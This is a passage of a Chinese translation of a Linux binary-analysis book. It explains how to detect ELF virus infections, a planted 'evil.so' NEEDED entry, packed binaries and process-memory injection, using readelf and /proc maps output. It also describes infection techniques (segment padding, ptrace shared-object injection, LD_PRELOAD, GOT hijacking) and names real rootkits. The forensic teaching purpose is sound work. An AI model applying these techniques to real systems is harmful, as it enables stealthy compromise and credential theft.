 0x0000000000000005 (STRTAB)             0x400380
 0x0000000000000006 (SYMTAB)             0x4002c0
 0x000000000000000a (STRSZ)              87 (bytes)
 0x000000000000000b (SYMENT)             24 (bytes)
 0x0000000000000015 (DEBUG)              0x0
 0x0000000000000003 (PLTGOT)             0x601000
 0x0000000000000002 (PLTRELSZ)           144 (bytes)
 0x0000000000000014 (PLTREL)             RELA
 0x0000000000000017 (JMPREL)             0x400438
 0x0000000000000007 (RELA)               0x400408
 0x0000000000000008 (RELASZ)             48 (bytes)
 0x0000000000000009 (RELAENT)            24 (bytes)
 0x000000006ffffffe (VERNEED)            0x4003e8
 0x000000006fffffff (VERNEEDNUM)         1
 0x000000006ffffff0 (VERSYM)             0x4003d8
 0x0000000000000000 (NULL)               0x0
```

这里有许多重要的标签类型，这些标签类型对于动态链接器在运行时导航二进制文件以便解析重定位和加载库是必要的。请注意，前面的代码中突出显示了称为`NEEDED`的标签类型。这是告诉动态链接器需要加载到内存中的共享库的动态条目。动态链接器将在由$`LD_LIBRARY_PATH`环境变量指定的路径中搜索指定的共享库。

很明显，攻击者可以向二进制文件中添加一个指定要加载的共享库的`NEEDED`条目。在我的经验中，这不是一种非常常见的技术，但这是一种可以用来告诉动态链接器加载任何你想要的库的技术。分析人员面临的问题是，如果操作正确，这种技术很难检测，也就是说，插入的`NEEDED`条目直接放在最后一个合法的`NEEDED`条目之后。这可能很困难，因为你必须将所有其他动态条目向前移动，为你的插入腾出空间。

在许多情况下，攻击者可能会以经验不足的方式进行操作，其中`NEEDED`条目位于所有其他条目的最末尾，而对象链接器永远不会这样做，因此，如果你看到一个动态段看起来像下面这样，你就知道出了问题。

以下是一个感染的动态段的示例：

```
$ readelf -d ./test

Dynamic section at offset 0xe28 contains 24 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
 0x000000000000000c (INIT)               0x4004c8
 0x000000000000000d (FINI)               0x400754
 0x0000000000000019 (INIT_ARRAY)         0x600e10
 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)
 0x000000000000001a (FINI_ARRAY)         0x600e18
 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)
 0x000000006ffffef5 (GNU_HASH)           0x400298
 0x0000000000000005 (STRTAB)             0x400380
 0x0000000000000006 (SYMTAB)             0x4002c0
 0x000000000000000a (STRSZ)              87 (bytes)
 0x000000000000000b (SYMENT)             24 (bytes)
 0x0000000000000015 (DEBUG)              0x0
 0x0000000000000003 (PLTGOT)             0x601000
 0x0000000000000002 (PLTRELSZ)           144 (bytes)
 0x0000000000000014 (PLTREL)             RELA
 0x0000000000000017 (JMPREL)             0x400438
 0x0000000000000007 (RELA)               0x400408
 0x0000000000000008 (RELASZ)             48 (bytes)
 0x0000000000000009 (RELAENT)            24 (bytes)
 0x000000006ffffffe (VERNEED)            0x4003e8
 0x000000006fffffff (VERNEEDNUM)         1
 0x000000006ffffff0 (VERSYM)             0x4003d8
 0x0000000000000001 (NEEDED)             Shared library: [evil.so]
 0x0000000000000000 (NULL)               0x0
```

# 识别反向文本填充感染

这是一种我们在第四章中讨论过的病毒感染技术，*ELF 病毒技术- Linux/Unix 病毒*。其思想是病毒或寄生体可以通过向后扩展文本段来为其代码腾出空间。如果你知道在找什么，文本段的程序头将会看起来很奇怪。

让我们看一个已感染病毒并使用这种寄生体感染方法的 ELF 64 位二进制文件：

```
readelf -l ./infected_host1

Elf file type is EXEC (Executable file)
Entry point 0x3c9040
There are 9 program headers, starting at offset 225344

Program Headers:
 Type         Offset             VirtAddr           PhysAddr
              FileSiz            MemSiz              Flags  Align
 PHDR         0x0000000000037040 0x0000000000400040 0x0000000000400040
              0x00000000000001f8 0x00000000000001f8  R E    8
 INTERP       0x0000000000037238 0x0000000000400238 0x0000000000400238
              0x000000000000001c 0x000000000000001c  R      1
      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
 LOAD         0x0000000000000000 0x00000000003ff000 0x00000000003ff000
              0x00000000000378e4 0x00000000000378e4  RWE    1000
 LOAD         0x0000000000037e10 0x0000000000600e10 0x0000000000600e10
              0x0000000000000248 0x0000000000000250  RW     1000
 DYNAMIC      0x0000000000037e28 0x0000000000600e28 0x0000000000600e28
              0x00000000000001d0 0x00000000000001d0  RW     8
 NOTE         0x0000000000037254 0x0000000000400254 0x0000000000400254
              0x0000000000000044 0x0000000000000044  R      4
 GNU_EH_FRAME 0x0000000000037744 0x0000000000400744 0x0000000000400744
              0x000000000000004c 0x000000000000004c  R      4
  GNU_STACK   0x0000000000037000 0x0000000000000000 0x0000000000000000
              0x0000000000000000 0x0000000000000000  RW     10
  GNU_RELRO   0x0000000000037e10 0x0000000000600e10 0x0000000000600e10
              0x00000000000001f0 0x00000000000001f0  R      1
```

在 Linux x86_64 上，文本段的默认虚拟地址是`0x400000`。这是因为链接器使用的默认链接脚本规定了这样做。程序头表（在前面标有 PHDR）在文件中的偏移为 64 字节，因此其虚拟地址为`0x400040`。从前面的输出中查看程序头，我们可以看到文本段（第一行 LOAD）没有预期的地址；相反，它是`0x3ff000`。然而，PHDR 虚拟地址仍然是`0x400040`，这告诉你，原始文本段地址曾经也是这样，这里发生了一些奇怪的事情。这是因为文本段基本上是向后扩展的，正如我们在第四章中讨论的那样，*ELF 病毒技术- Linux/Unix 病毒*。

![识别反向文本填充感染](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/lrn-linux-bin-anls/img/00014.jpeg)

图示-显示反向文本填充感染的可执行文件

以下是反向文本感染可执行文件的 ELF 文件头：

```
$ readelf -h ./infected_host1
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
 Entry point address:               0x3ff040
 Start of program headers:          225344 (bytes into file)
 Start of section headers:          0 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         9
  Size of section headers:           64 (bytes)
  Number of section headers:         0
  Section header string table index: 0
```

我已经突出显示了 ELF 头中所有可疑的内容：

+   入口点指向寄生体区域

+   程序头的开始应该只有 64 字节

+   段头表偏移为 0，就像被剥离的那样

# 识别文本段填充感染

这种类型的感染相对容易检测。这种类型的感染也在第四章中讨论过，*ELF 病毒技术- Linux/Unix 病毒*。这种技术依赖于文本段和数据段之间始终会有至少 4096 字节的事实，因为它们作为两个单独的内存段加载到内存中，并且内存映射始终是页面对齐的。

在 64 位系统上，通常由于**PSE**（**页面大小扩展**）页面，会有`0x200000`（2MB）的空闲空间。这意味着 64 位 ELF 二进制文件可以插入一个 2MB 的寄生体，这比通常需要的注入空间要大得多。像任何其他类型的感染一样，通过检查控制流，通常可以确定寄生体的位置。

例如，我在 2008 年编写的`lpv`病毒，入口点被修改为从使用文本段填充感染插入的寄生体开始执行。如果被感染的可执行文件有一个段头表，你会看到入口点地址位于文本段内最后一个部分的范围内。让我们来看一个使用这种技术被感染的 32 位 ELF 可执行文件。

![识别文本段填充感染](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/lrn-linux-bin-anls/img/00015.jpeg)

插图 - 显示文本段填充感染的图表

以下是`lpv`感染文件的 ELF 文件头：

```
$ readelf -h infected.lpv
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Intel 80386
  Version:                           0x1
 Entry point address:               0x80485b8
  Start of program headers:          52 (bytes into file)
  Start of section headers:          8524 (bytes into file)
  Flags:                             0x0
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         9
  Size of section headers:           40 (bytes)
  Number of section headers:         30
  Section header string table index: 27
```

注意入口地址`0x80485b8`。这个地址是否指向`.text`段的内部？让我们来看一下段头表，找出答案。

以下是`lpv`感染文件的 ELF 段头：

```
$ readelf -S infected.lpv
There are 30 section headers, starting at offset 0x214c:

Section Headers:
  [Nr] Name              Type         Addr        Off
       Size              ES           Flg Lk Inf Al
  [ 0]                   NULL         00000000    000000
       000000            00           0   0  0
  [ 1] .interp           PROGBITS     08048154    000154
       000013            00           A   0  0   1
  [ 2] .note.ABI-tag     NOTE         08048168    000168
       000020            00           A   0  0   4
  [ 3] .note.gnu.build-i NOTE         08048188    000188
       000024            00           A   0  0   4
  [ 4] .gnu.hash         GNU_HASH     080481ac    0001ac
       000020            04           A   5  0   4
  [ 5] .dynsym           DYNSYM       080481cc    0001cc
       000050            10           A   6  1   4
  [ 6] .dynstr           STRTAB       0804821c    00021c
       00004a            00           A   0  0   1
  [ 7] .gnu.version      VERSYM       08048266    000266
       00000a            02           A   5  0   2
  [ 8] .gnu.version_r    VERNEED      08048270    000270
       000020            00           A   6  1   4
  [ 9] .rel.dyn          REL          08048290    000290
       000008            08           A   5  0   4
  [10] .rel.plt          REL          08048298    000298
       000018            08           A   5  12  4
  [11] .init             PROGBITS     080482b0    0002b0
       000023            00           AX  0  0   4
  [12] .plt              PROGBITS     080482e0    0002e0
       000040            04           AX  0  0   16

  [13] .text             PROGBITS     08048320    000320
       000192            00           AX  0  0   16
  [14] .fini             PROGBITS     080484b4    0004b4
       000014            00           AX  0  0   4
  [15] .rodata           PROGBITS     080484c8    0004c8
       000014            00           A   0  0   4
  [16] .eh_frame_hdr     PROGBITS     080484dc    0004dc
       00002c            00           A   0  0   4
 [17] .eh_frame         PROGBITS     08048508    000508
 00083b            00           A   0  0   4
  [18] .init_array       INIT_ARRAY   08049f08    001f08
       000004            00           WA   0  0   4
  [19] .fini_array       FINI_ARRAY   08049f0c    001f0c
       000004            00           WA   0  0   4
  [20] .jcr              PROGBITS     08049f10    001f10
       000004            00           WA   0  0   4
  [21] .dynamic          DYNAMIC      08049f14    001f14
       0000e8            08           WA   6  0   4
  [22] .got              PROGBITS     08049ffc    001ffc
       000004            04           WA   0  0   4
  [23] .got.plt          PROGBITS     0804a000    002000
       000018            04           WA   0  0   4
  [24] .data             PROGBITS     0804a018    002018
       000008            00           WA   0  0   4
  [25] .bss              NOBITS       0804a020    002020
       000004            00           WA   0  0   1
  [26] .comment          PROGBITS     00000000    002020
       000024            01           MS   0  0   1
  [27] .shstrtab         STRTAB       00000000    002044
       000106            00           0   0  1
  [28] .symtab           SYMTAB       00000000    0025fc
       000430            10           29  45 4
  [29] .strtab           STRTAB       00000000    002a2c
       00024f            00           0   0  1
```

入口地址位于`.eh_frame`部分内，这是文本段中的最后一个部分。这显然不是`.text`部分，这足以立即引起怀疑，因为`.eh_frame`部分是文本段中的最后一个部分（你可以通过使用`readelf -l`来验证），我们能够推断出这种病毒感染可能是使用文本段填充感染。以下是`lpv`感染文件的 ELF 程序头：

```
$ readelf -l infected.lpv

Elf file type is EXEC (Executable file)
Entry point 0x80485b8
There are 9 program headers, starting at offset 52

Program Headers:
  Type          Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR          0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
  INTERP        0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
 LOAD          0x000000 0x08048000 0x08048000 0x00d43 0x00d43 R E 0x1000
  LOAD          0x001f08 0x08049f08 0x08049f08 0x00118 0x0011c RW  0x1000
  DYNAMIC       0x001f14 0x08049f14 0x08049f14 0x000e8 0x000e8 RW  0x4
  NOTE          0x001168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
  GNU_EH_FRAME  0x0014dc 0x080484dc 0x080484dc 0x0002c 0x0002c R   0x4
  GNU_STACK     0x001000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
  GNU_RELRO     0x001f08 0x08049f08 0x08049f08 0x000f8 0x000f8 R   0x1

 Section to Segment mapping:
  Segment Sections...
   00     
   01     .interp
   02     .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .text .fini .rodata .eh_frame_hdr .eh_frame
   03     .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss
   04     .dynamic
   05     
   06     
   07     
   08     .init_array .fini_array .jcr .dynamic .got
```

根据前面的程序头输出中突出显示的一切，你可以看到程序入口点、文本段（第一个`LOAD`程序头）以及事实上`.eh_frame`是文本段中的最后一个部分。

# 识别受保护的二进制文件

识别受保护的二进制文件是逆向工程的第一步。我们在第五章中讨论了受保护的 ELF 可执行文件的常见解剖结构，*Linux 二进制保护*。根据我们所学到的，受保护的二进制实际上是两个合并在一起的可执行文件：你有存根可执行文件（解密程序），然后是目标可执行文件。

一个程序负责解密另一个程序，通常这个程序会包含一个加密的二进制文件，作为一种有效载荷。识别这个外部程序，我们称之为存根，通常是相当容易的，因为你会在程序头表中看到明显的奇怪之处。

让我们来看一个使用我在 2009 年编写的`elfcrypt`保护的 64 位 ELF 二进制文件：

```
$ readelf -l test.elfcrypt

Elf file type is EXEC (Executable file)
Entry point 0xa01136
There are 2 program headers, starting at offset 64

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  LOAD           0x0000000000000000 0x0000000000a00000 0x0000000000a00000
                 0x0000000000002470 0x0000000000002470  R E    1000
  LOAD           0x0000000000003000 0x0000000000c03000 0x0000000000c03000
                 0x000000000003a23f 0x000000000003b4df  RW     1000
```

那么我们在这里看到了什么？或者更确切地说，我们没有看到什么？

这几乎看起来像是一个静态编译的可执行文件，因为没有`PT_DYNAMIC`段，也没有`PT_INTERP`段。然而，如果我们运行这个二进制文件并检查`/proc/$pid/maps`，我们会发现这不是一个静态编译的二进制文件，而是动态链接的。

以下是受保护二进制文件中`/proc/$pid/maps`的输出：

```
7fa7e5d44000-7fa7e9d43000 rwxp 00000000 00:00 0
7fa7e9d43000-7fa7ea146000 rw-p 00000000 00:00 0
7fa7ea146000-7fa7ea301000 r-xp 00000000 08:01 11406096  /lib/x86_64-linux-gnu/libc-2.19.so7fa7ea301000-7fa7ea500000 ---p 001bb000 08:01 11406096  /lib/x86_64-linux-gnu/libc-2.19.so
7fa7ea500000-7fa7ea504000 r--p 001ba000 08:01 11406096  /lib/x86_64-linux-gnu/libc-2.19.so
7fa7ea504000-7fa7ea506000 rw-p 001be000 08:01 11406096  /lib/x86_64-linux-gnu/libc-2.19.so
7fa7ea506000-7fa7ea50b000 rw-p 00000000 00:00 0
7fa7ea530000-7fa7ea534000 rw-p 00000000 00:00 0
7fa7ea535000-7fa7ea634000 rwxp 00000000 00:00 0                          [stack:8176]
7fa7ea634000-7fa7ea657000 rwxp 00000000 00:00 0
7fa7ea657000-7fa7ea6a1000 r--p 00000000 08:01 11406093  /lib/x86_64-linux-gnu/ld-2.19.so
7fa7ea6a1000-7fa7ea6a5000 rw-p 00000000 00:00 0
7fa7ea856000-7fa7ea857000 r--p 00000000 00:00 0
```

我们可以清楚地看到动态链接器被映射到进程地址空间中，libc 也是如此。正如在第五章中讨论的那样，这是因为保护存根负责加载动态链接器并设置辅助向量。

从程序头输出中，我们还可以看到文本段地址是`0xa00000`，这是不寻常的。在 x86_64 Linux 中用于编译可执行文件的默认链接器脚本将文本地址定义为`0x400000`，在 32 位系统上是`0x8048000`。文本地址与默认值不同并不意味着有任何恶意行为，但应立即引起怀疑。在二进制保护程序的情况下，存根必须具有不与其保护的自嵌入可执行文件的虚拟地址冲突的虚拟地址。

## 分析受保护的二进制文件

真正有效的二进制保护方案不太容易被绕过，但在大多数情况下，您可以使用一些中间的逆向工程方法来突破加密层。存根负责解密其中的自嵌可执行文件，因此可以从内存中提取。诀窍是允许存根运行足够长的时间，以将加密的可执行文件映射到内存并解密它。

可以使用一个非常通用的算法，它倾向于在简单的保护程序上起作用，特别是如果它们不包含任何反调试技术。

1.  确定存根文本段中的近似指令数，表示为 N。

1.  跟踪 N 条指令的程序。

1.  从文本段的预期位置（例如`0x400000`）转储内存，并使用新发现的文本段的程序头找到其数据段。

这种简单技术的一个很好的例子可以用我在 2008 年编写的 32 位 ELF 操作软件 Quenya 来演示。

### 注意

UPX 不使用任何反调试技术，因此相对来说解包相对简单。

以下是一个打包可执行文件的程序头：

```
$ readelf -l test.packed

Elf file type is EXEC (Executable file)
Entry point 0xc0c500
There are 2 program headers, starting at offset 52

Program Headers:
  Type          Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  LOAD          0x000000 0x00c01000 0x00c01000 0x0bd03 0x0bd03 R E 0x1000
  LOAD          0x000f94 0x08063f94 0x08063f94 0x00000 0x00000 RW  0x1000
```

我们可以看到存根从`0xc01000`开始，并且 Quenya 将假定真正的文本段位于 32 位 ELF 可执行文件的预期地址：`0x8048000`。

这里是 Quenya 使用其解包功能来解压`test.packed`：

```
$ quenya

Welcome to Quenya v0.1 -- the ELF modification and analysis tool
Designed and maintained by ElfMaster

Type 'help' for a list of commands
[Quenya v0.1@workshop] unpack test.packed test.unpacked
Text segment size: 48387 bytes
[+] Beginning analysis for executable reconstruction of process image (pid: 2751)
[+] Getting Loadable segment info...
[+] Found loadable segments: text segment, data segment
[+] text_vaddr: 0x8048000 text_offset: 0x0
[+] data_vaddr: 0x8062ef8 data_offset: 0x19ef8
[+] Dynamic segment location successful
[+] PLT/GOT Location: Failed
[+] Could not locate PLT/GOT within dynamic segment; attempting to skip PLT patches...
Opening output file: test.unpacked
Successfully created executable
```

正如我们所看到的，Quenya 解包功能据称已解包了 UPX 打包的可执行文件。我们可以通过简单查看解包后的可执行文件的程序头来验证这一点。

```
readelf -l test.unpacked

Elf file type is EXEC (Executable file)
Entry point 0x804c041
There are 9 program headers, starting at offset 52

Program Headers:
  Type          Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR          0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
  INTERP        0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD          0x000000 0x08048000 0x08048000 0x19b80 0x19b80 R E 0x1000
  LOAD          0x019ef8 0x08062ef8 0x08062ef8 0x00448 0x0109c RW  0x1000
  DYNAMIC       0x019f04 0x08062f04 0x08062f04 0x000f8 0x000f8 RW  0x4
  NOTE          0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
  GNU_EH_FRAME  0x016508 0x0805e508 0x0805e508 0x00744 0x00744 R   0x4
  GNU_STACK     0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
  GNU_RELRO     0x019ef8 0x08062ef8 0x08062ef8 0x00108 0x00108 R   0x1
```

请注意，程序头与我们之前查看的程序头完全不同，当可执行文件仍然被打包时。这是因为我们不再查看存根可执行文件。我们正在查看存根内部压缩的可执行文件。我们使用的解包技术非常通用，对于更复杂的保护方案效果不是很好，但有助于初学者了解保护二进制的逆向过程。

# IDA Pro

由于本书试图专注于 ELF 格式的解剖和分析修补技术背后的概念，我们不太关注使用哪些花哨的工具。非常著名的 IDA Pro 软件享有当之无愧的声誉。它是公开可用的最好的反汇编器和反编译器。它虽然昂贵，但除非您能负担得起许可证，否则您可能需要接受一些效果稍逊的东西，比如 Hopper。IDA Pro 相当复杂，需要一本专门的书来介绍，但为了正确理解和使用 IDA Pro 来逆向工程软件，最好先理解本书教授的概念，然后在使用 IDA Pro 时应用这些概念。

# 摘要

在本章中，您学习了 ELF 二进制分析的基础知识。您研究了识别各种类型的病毒感染、函数劫持和二进制保护所涉及的程序。本章将在 ELF 二进制分析的初学者到中级阶段为您提供帮助：要寻找什么以及如何识别它。在接下来的章节中，您将涵盖类似的概念，例如分析进程内存以识别后门和驻留内存病毒等异常。

对于那些想了解本章描述的方法如何在反病毒或检测软件开发中使用的人，我设计了一些工具，这些工具使用了类似于本章描述的启发式方法来检测 ELF 感染。其中一个工具叫做 AVU，在第四章中提到过，并附有下载链接。另一个工具叫做 Arcana，目前还是私有的。我个人还没有看到市面上有任何使用这些启发式方法来检测 ELF 二进制文件的公开产品，尽管这样的工具在 Linux 二进制取证方面是非常需要的。在第八章中，我们将探讨 ECFS，这是我一直在努力改进的技术，特别是在涉及进程内存取证方面的能力不足的领域。


# 第七章：进程内存取证

在上一章中，我们检查了在 Linux 中分析 ELF 二进制文件时的关键方法和方法，特别是在涉及恶意软件时，以及检测可执行代码中寄生体存在的方法。

正如攻击者可能会在磁盘上对二进制文件进行打补丁一样，他们也可能会在内存中对运行的程序进行打补丁，以实现类似的目标，同时避免被寻找文件修改的程序检测到，比如 tripwire。这种对进程映像的热打补丁可以用于劫持函数、注入共享库、执行寄生壳代码等。这些类型的感染通常是内存驻留后门、病毒、键盘记录器和隐藏进程所需的组件。

### 注意

攻击者可以运行复杂的程序，这些程序将在现有进程地址空间内运行。这已经在 Saruman v0.1 中得到证明，可以在[`www.bitlackeys.org/#saruman`](http://www.bitlackeys.org/#saruman)找到。

在进行取证或运行时分析时，对进程映像的检查与查看常规 ELF 二进制文件非常相似。在进程地址空间中有更多的段和整体移动部分，ELF 可执行文件将经历一些变化，例如运行时重定位、段对齐和.bss 扩展。

然而，实际上，对 ELF 可执行文件和实际运行的程序进行调查步骤非常相似。运行的程序最初是由加载到地址空间的 ELF 映像创建的。因此，了解 ELF 格式将有助于理解进程在内存中的外观。

# 进程的外观是什么样的？

在任何 Linux 系统上，一个重要的文件是`/proc/$pid/maps`文件。这个文件显示了运行程序的整个进程地址空间，我经常解析它以确定某些文件或内存映射在进程中的位置。

在具有 Grsecurity 补丁的 Linux 内核上，有一个名为 GRKERNSEC_PROC_MEMMAP 的内核选项，如果启用，将清零`/proc/$pid/maps`文件，以便您无法看到地址空间的值。这使得从外部解析进程变得更加困难，您必须依赖其他技术，如解析 ELF 头文件并从那里开始。

### 注意

在下一章中，我们将讨论**ECFS**（扩展核心文件快照）格式，这是一种新的 ELF 文件格式，它扩展了常规核心文件，并包含大量取证相关的数据。

以下是`hello_world`程序的进程内存布局示例：

```
$ cat /proc/`pidof hello_world`/maps
00400000-00401000 r-xp 00000000 00:1b 8126525    /home/ryan/hello_world
00600000-00601000 r--p 00000000 00:1b 8126525    /home/ryan/hello_world
00601000-00602000 rw-p 00001000 00:1b 8126525    /home/ryan/hello_world
0174e000-0176f000 rw-p 00000000 00:00 0          [heap]
7fed9c5a7000-7fed9c762000 r-xp 00000000 08:01 11406096   /lib/x86_64-linux-gnu/libc-2.19.so
7fed9c762000-7fed9c961000 ---p 001bb000 08:01 11406096   /lib/x86_64-linux-gnu/libc-2.19.so
7fed9c961000-7fed9c965000 r--p 001ba000 08:01 11406096   /lib/x86_64-linux-gnu/libc-2.19.so
7fed9c965000-7fed9c967000 rw-p 001be000 08:01 11406096   /lib/x86_64-linux-gnu/libc-2.19.so
7fed9c967000-7fed9c96c000 rw-p 00000000 00:00 0
7fed9c96c000-7fed9c98f000 r-xp 00000000 08:01 11406093   /lib/x86_64-linux-gnu/ld-2.19.so
7fed9cb62000-7fed9cb65000 rw-p 00000000 00:00 0
7fed9cb8c000-7fed9cb8e000 rw-p 00000000 00:00 0
7fed9cb8e000-7fed9cb8f000 r--p 00022000 08:01 11406093   /lib/x86_64-linux-gnu/ld-2.19.so
7fed9cb8f000-7fed9cb90000 rw-p 00023000 08:01 11406093   /lib/x86_64-linux-gnu/ld-2.19.so
7fed9cb90000-7fed9cb91000 rw-p 00000000 00:00 0
7fff0975f000-7fff09780000 rw-p 00000000 00:00 0          [stack]
7fff097b2000-7fff097b4000 r-xp 00000000 00:00 0          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0  [vsyscall]
```

前面的 maps 文件输出显示了一个非常简单的`Hello World`程序的进程地址空间。让我们分几块来解释每个部分。

## 可执行内存映射

前三行是可执行文件本身的内存映射。这是相当明显的，因为它显示了文件映射的末尾处的可执行路径：

```
00400000-00401000 r-xp 00000000 00:1b 8126525  /home/ryan/hello_world
00600000-00601000 r--p 00000000 00:1b 8126525  /home/ryan/hello_world
00601000-00602000 rw-p 00001000 00:1b 8126525  /home/ryan/hello_world
```

我们可以看到：

+   第一行是文本段，很容易识别，因为权限是读取加执行

+   第二行是数据段的第一部分，由于 RELRO（只读重定位）安全保护而被标记为只读

+   第三个映射是仍然可写的数据段的剩余部分

## 程序堆

堆通常在数据段之后增长。在 ASLR 存在之前，它是从数据段地址的末尾扩展的。如今，堆段是随机内存映射的，但可以在*maps*文件中在数据段结束后找到：

```
0174e000-0176f000 rw-p 00000000 00:00 0          [heap]
```

当调用`malloc()`请求一个超过`MMAP_THRESHOLD`大小的内存块时，还可能创建匿名内存映射。这些类型的匿名内存段不会被标记为`[heap]`。

## 共享库映射

接下来的四行是共享库`libc-2.19.so`的内存映射。请注意，在文本和数据段之间有一个标记为无权限的内存映射。这只是为了占据该区域的空间，以便不会创建其他任意内存映射来使用文本和数据段之间的空间：

```
7fed9c5a7000-7fed9c762000 r-xp 00000000 08:01 11406096   /lib/x86_64-linux-gnu/libc-2.19.so
7fed9c762000-7fed9c961000 ---p 001bb000 08:01 11406096   /lib/x86_64-linux-gnu/libc-2.19.so
7fed9c961000-7fed9c965000 r--p 001ba000 08:01 11406096   /lib/x86_64-linux-gnu/libc-2.19.so
7fed9c965000-7fed9c967000 rw-p 001be000 08:01 11406096   /lib/x86_64-linux-gnu/libc-2.19.so
```

除了常规的共享库之外，还有动态链接器，从技术上讲也是一个共享库。我们可以看到它通过查看`libc`映射后的文件映射来映射到地址空间：

```
7fed9c96c000-7fed9c98f000 r-xp 00000000 08:01 11406093   /lib/x86_64-linux-gnu/ld-2.19.so
7fed9cb62000-7fed9cb65000 rw-p 00000000 00:00 0
7fed9cb8c000-7fed9cb8e000 rw-p 00000000 00:00 0
7fed9cb8e000-7fed9cb8f000 r--p 00022000 08:01 11406093   /lib/x86_64-linux-gnu/ld-2.19.so
7fed9cb8f000-7fed9cb90000 rw-p 00023000 08:01 11406093   /lib/x86_64-linux-gnu/ld-2.19.so
7fed9cb90000-7fed9cb91000 rw-p 00000000 00:00 0
```

## 栈、vdso 和 vsyscall

在映射文件的末尾，您将看到栈段，接着是**VDSO**（**虚拟动态共享对象**）和 vsyscall：

```
7fff0975f000-7fff09780000 rw-p 00000000 00:00 0          [stack]
7fff097b2000-7fff097b4000 r-xp 00000000 00:00 0          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0  [vsyscall]
```

VDSO 是`glibc`用来调用频繁调用的系统调用的，否则会导致性能问题。VDSO 通过在用户空间执行某些 syscalls 来加快速度。在 x86_64 上，vsyscall 页面已被弃用，但在 32 位上，它实现了与 VDSO 相同的功能。

![栈、vdso 和 vsyscall](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/lrn-linux-bin-anls/img/00016.jpeg)

进程是什么样子的

# 进程内存感染

有许多 rootkits、病毒、后门和其他工具可以用来感染系统的用户空间内存。我们现在将命名并描述其中的一些。

## 进程感染工具

+   **Azazel**：这是一个简单但有效的 Linux 用户空间 rootkit，基于其前身 rootkit Jynx。`LD_PRELOAD` rootkits 将预加载一个共享对象到您想要感染的程序中。通常，这样的 rootkit 将劫持函数，如 open、read、write 等。这些被劫持的函数将显示为 PLT 钩子（修改的 GOT）。有关更多信息，请访问[`github.com/chokepoint/azazel`](https://github.com/chokepoint/azazel)。

+   **Saruman**：这是一种相对较新的反取证感染技术，允许用户将完整的动态链接可执行文件注入到现有进程中。注入者和被注入者将在相同的地址空间内同时运行。这允许隐秘和高级的远程进程感染。有关更多信息，请访问[`github.com/elfmaster/saruman`](https://github.com/elfmaster/saruman)。

+   **sshd_fucker（phrack .so 注入论文）**：`sshd_fucker`是随 Phrack 59 论文*Runtime process infection*一起提供的软件。该软件感染 sshd 进程并劫持 PAM 函数，用户名和密码通过这些函数传递。有关更多信息，请访问[`phrack.org/issues/59/8.html`](http://phrack.org/issues/59/8.html)

## 进程感染技术

进程感染是什么意思？对于我们的目的，这意味着描述将代码注入进程、劫持函数、劫持控制流和反取证技巧，以使分析更加困难。这些技术中的许多在第四章中已经涵盖，*ELF 病毒技术- Linux/Unix 病毒*，但我们将在这里重述其中的一些。

### 注入方法

+   **ET_DYN（共享对象）注入**：这是使用`ptrace()`系统调用和使用`mmap()`或`__libc_dlopen_mode()`函数加载共享库文件的 shellcode 来实现的。共享对象可能根本不是共享对象；它可能是一个 PIE 可执行文件，就像 Saruman 感染技术一样，这是一种允许程序在现有进程地址空间内运行的反取证形式。这种技术就是我所说的**进程伪装**。

### 注意

`LD_PRELOAD`是另一个常见的技巧，用于将恶意共享库加载到进程地址空间中，以劫持共享库函数。这可以通过验证 PLT/GOT 来检测。还可以分析栈上的环境变量，以找出是否已设置`LD_PRELOAD`。

+   ET_REL（可重定位对象）注入：这里的想法是将可重定位对象文件注入到进程中，用于高级热修补技术。 ptrace 系统调用（或使用`ptrace()`的程序，如 GDB）可用于将 shellcode 注入到进程中，进而将对象文件内存映射到内存中。

+   PIC 代码（shellcode）注入：将 shellcode 注入到进程通常使用 ptrace 完成。通常，shellcode 是向进程注入更复杂代码（如`ET_DYN`和`ET_REL`文件）的第一阶段。

### 劫持执行的技术

+   PLT/GOT 重定向：劫持共享库函数最常见的方法是修改给定共享库的 GOT 条目，以便地址反映攻击者注入代码的位置。这本质上与覆盖函数指针相同。我们将在本章后面讨论检测这一点的方法。

